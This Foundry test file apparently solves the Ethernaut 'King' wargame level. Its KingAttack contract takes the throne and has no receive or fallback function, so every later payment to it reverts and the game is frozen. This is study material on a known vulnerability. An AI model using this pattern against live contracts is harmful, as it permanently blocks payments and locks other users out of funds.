// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {King} from "src/ethernaut-009-king/King.sol";

contract KingTest is Test {
    King public king;

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.deal(deployer, 2 ether);
        vm.prank(deployer);
        king = new King{value: 1 ether}();
    }

    function test_king() public {
        KingAttack attackerContract = new KingAttack{value: 2 ether}(payable(address(king)));
        assertEq(king._king(), address(attackerContract));

        // try to send more ether to the KingAttack contract
        vm.expectRevert();
        payable(address(king)).call{value: 3 ether}("");
    }
}

contract KingAttack {
    // no receive() - no ETH transfer
    // no fallback() - ETH transfer will fail

    constructor(address payable _kingContract) payable {
        uint256 prize = King(_kingContract).prize();
        (bool success,) = _kingContract.call{value: prize}("");
        require(success, "Failed to send ether");
    }
}
